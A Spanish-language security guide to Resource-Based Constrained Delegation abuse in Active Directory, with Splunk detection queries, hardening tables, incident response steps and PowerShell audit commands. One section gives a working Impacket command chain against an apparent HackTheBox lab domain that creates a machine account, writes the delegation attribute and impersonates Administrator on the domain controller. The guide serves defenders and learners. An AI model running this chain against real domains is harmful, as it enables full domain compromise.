# 🛑 Ataques de **Resource-Based Constrained Delegation (RBCD) en Active Directory**

---

## 📝 ¿Qué es RBCD y por qué es peligroso?

| Concepto      | Descripción                                                                                                       |
|---------------|------------------------------------------------------------------------------------------------------------------|
| **Definición**| Mecanismo de delegación Kerberos que permite a un recurso (servidor/posterior) decidir qué cuentas pueden suplantar identidades de usuario para acceder a él. |
| **Finalidad** | Permite a sistemas intermedios actuar en nombre de usuarios, pero su mala configuración o abuso permite a atacantes obtener acceso total a recursos críticos, incluso a controladores de dominio. |

---

## 🛠️ ¿Cómo funciona y cómo se explota RBCD? (TTPs y ejemplos)

| Vector/Nombre              | Descripción breve                                                                                   |
|----------------------------|----------------------------------------------------------------------------------------------------|
| **Creación de máquina atacante** | Un usuario estándar crea una cuenta de máquina (si MachineAccountQuota > 0) y la usa para delegar hacia el recurso deseado. |
| **Secuestro de máquina existente** | El atacante compromete una cuenta de máquina ya existente y la usa como "frontal" para el ataque. |
| **Abuso de permisos delegados/WriteProperty** | El atacante encuentra permisos de escritura o delegación sobre el atributo RBCD de un recurso y añade su propia cuenta. |
| **Cuentas de servicio/gMSA**     | El atacante compromete cuentas de servicio gestionadas y abusa de ellas para delegar vía RBCD. |
| **Multi-forest/trusts**          | Explotación de trusts mal configurados entre bosques o dominios para escalar privilegios vía RBCD cruzado. |
| **Cuentas máquina huérfanas**    | Uso de cuentas máquina antiguas, olvidadas o sin monitorizar como vector de entrada.            |

---

## 💻 Ejemplo práctico ofensivo (paso a paso)

```bash
# 1. Crear máquina atacante (si MachineAccountQuota > 0)
addcomputer.py -dc-ip 10.10.11.174 soporte.htb/usuario:Password123 -computer-name atacante -computer-pass Password2025!

# 2. Delegar atacante$ en el recurso objetivo (ejemplo: DC$)
rbcd.py -dc-ip 10.10.11.174 -action write -delegate-to DC$ -delegate-from atacante$ soporte.htb/usuario:Password123

# 3. Obtener ticket S4U2Proxy para el servicio objetivo (suplantando a Administrator)
getST.py -dc-ip 10.10.11.174 -spn host/DC.SOPORTE.HTB -impersonate Administrator soporte.htb/atacante$:Password2025!

# 4. Usar el ticket Kerberos para acceso remoto
export KRB5CCNAME=$(pwd)/Administrator.ccache
nxc smb DC.SOPORTE.HTB -k -no-pass -u Administrator
# O bien
wmiexec.py -k -no-pass soporte.htb/Administrator@DC.SOPORTE.HTB
```

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 4741**            | Creación de cuentas máquina en el dominio.                                   |
| **EventCode = 5136/4662**       | Cambios en el atributo msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD).      |
| **EventCode = 4769**            | Solicitud de tickets de servicio Kerberos S4U2Proxy (TGS) para servicios críticos. |
| **AccountName = *$**            | Uso de cuentas máquina en eventos de acceso o autenticación.                 |
| **CommandLine/Image (Sysmon)**  | Procesos como python.exe, getST.py, rbcd.py, addcomputer.py, nxc, wmiexec.   |

### Query Splunk: Creación de cuentas máquina

```splunk
index=wineventlog EventCode=4741
| table _time, TargetUserName, SubjectUserName, ComputerName
```

### Query: Cambios en RBCD de recursos críticos

```splunk
index=wineventlog (EventCode=5136 OR EventCode=4662) msDS-AllowedToActOnBehalfOfOtherIdentity
| table _time, ObjectDN, SubjectUserName, AttributeValue
```

### Query: Solicitudes S4U2Proxy a servicios clave

```splunk
index=wineventlog EventCode=4769
| search (ServiceName="host/*" OR ServiceName="cifs/*")
| table _time, ServiceName, TicketOptions, IpAddress, AccountName
| where TicketOptions="0x40810000"
```

### Query: Procesos ofensivos en Sysmon

```splunk
index=sysmon_logs EventCode=1
| search (Image="*python.exe" OR CommandLine="*rbcd.py*" OR CommandLine="*getST.py*" OR CommandLine="*addcomputer.py*" OR CommandLine="*nxc*" OR CommandLine="*wmiexec*")
| table _time, Computer, User, Image, CommandLine
```

---

## 🦾 Hardening y mitigación

| Medida                                         | Descripción                                                                                       |
|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| **MachineAccountQuota a 0**                    | Solo los administradores pueden crear cuentas máquina.                                            |
| **Auditoría continua de cambios en RBCD**      | Alerta y revisa cada cambio en el atributo msDS-AllowedToActOnBehalfOfOtherIdentity.              |
| **Inventario y limpieza periódica de RBCD**    | Script diario que inventaría y limpia delegaciones no aprobadas fuera de ventanas de cambio.       |
| **Revisión y control de SPN**                  | Solo cuentas autorizadas deben tener SPN críticos (HTTP, CIFS, HOST, etc).                        |
| **Permisos delegados revisados**               | Audita y elimina GenericWrite/WriteProperty/GenericAll sobre objetos máquina y servicio.           |
| **Deshabilita/elimina cuentas máquina huérfanas** | Limpieza periódica de cuentas máquina sin uso, antiguas o fuera de inventario.                  |
| **Honeypots y honeymachines**                  | Crea máquinas trampa con RBCD, alerta ante cualquier intento de delegación sobre ellas.           |
| **LDAPS y LDAP signing obligatorio**           | Impide cambios no autenticados/firmados en atributos críticos de AD.                              |
| **Zero Standing Privilege**                    | Minimiza y monitoriza cuentas con permisos de escritura en AD.                                    |
| **Integración SOAR**                           | Playbooks automáticos que revocan delegaciones, eliminan cuentas y notifican al SOC ante detección. |
| **Monitorización avanzada de acceso con tickets**| Correlaciona emisión de TGS, acceso a SMB, WMI, WinRM y uso de cuentas máquina/servicio.         |

---

## 🚨 Respuesta ante incidentes

1. **Revoca la delegación RBCD en el recurso afectado** (quita la cuenta atacante de msDS-AllowedToActOnBehalfOfOtherIdentity).
2. **Elimina la cuenta máquina atacante o comprometida.**
3. **Forzar expiración de tickets Kerberos y cerrar sesiones activas.**
4. **Audita accesos recientes con tickets S4U2Proxy o cuentas máquina.**
5. **Rota credenciales de cuentas privilegiadas y revisa SPN.**
6. **Refuerza controles, MachineAccountQuota y permisos delegados.**
7. **Reporta el incidente y revisa posibles movimientos laterales/adicionales.**

---

## 🧑‍💻 ¿Cómo revisar delegaciones RBCD y cuentas máquina? (PowerShell)

### Listar delegaciones RBCD activas en todos los equipos

```powershell
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount |
 Where-Object { $_.PrincipalsAllowedToDelegateToAccount } |
 Select-Object Name,PrincipalsAllowedToDelegateToAccount
```

### Comprobar SPN críticos en cuentas máquina

```powershell
Get-ADComputer -Filter * -Properties ServicePrincipalName |
 Where-Object { $_.ServicePrincipalName } |
 Select-Object Name,ServicePrincipalName
```

### Listar cuentas máquina inactivas o antiguas

```powershell
Search-ADAccount -AccountInactive -ComputersOnly
```

### Revisar permisos delegados peligrosos

```powershell
# Requiere BloodHound, PowerView o scripts avanzados, pero ejemplo básico:
Get-ACL "AD:\CN=posterior,OU=Equipos,DC=dominio,DC=local" | Format-List
```

---

## 🧠 Soluciones innovadoras y hardening avanzado

- **Honeymachines con RBCD trampa:**  
  Cuentas de máquina señuelo con alertas SIEM ante cualquier intento de delegación.
- **Inventario y limpieza automatizada:**  
  Scripts SOAR que eliminan delegaciones RBCD no aprobadas periódicamente.
- **Alertas de correlación inteligente:**  
  Relaciona creación de máquina + cambio en RBCD + emisión de TGS en ventana corta = alerta crítica.
- **Integración con Threat Intelligence:**  
  IOC sobre hashes, procesos y patrones de ataque RBCD en correlación con campañas activas.
- **YARA custom para procesos ofensivos:**  
  Detección en EDR/Sysmon de procesos, comandos y patrones de abuso de Kerberos/RBCD.
- **Bloqueo proactivo:**  
  SIEM/SOAR que automáticamente deshabilita cuentas máquina o delegaciones RBCD ante detección de ataque.

---

## 📚 Referencias

- [Ataques RBCD - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation-rbcd)
- [Impacket RBCD tools](https://github.com/fortra/impacket)
- [RBCD & Abuse - dirkjanm blog](https://dirkjanm.io/abusing-azure-ad-synchronize-accounts/)
- [CVE-2021-42278 y 42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
- [Microsoft Doc - RBCD](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [BloodHound - Delegaciones y permisos](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#resource-based-constrained-delegation-rbcd)
- [SOAR Playbooks para RBCD](https://github.com/SplunkSOAR)

---
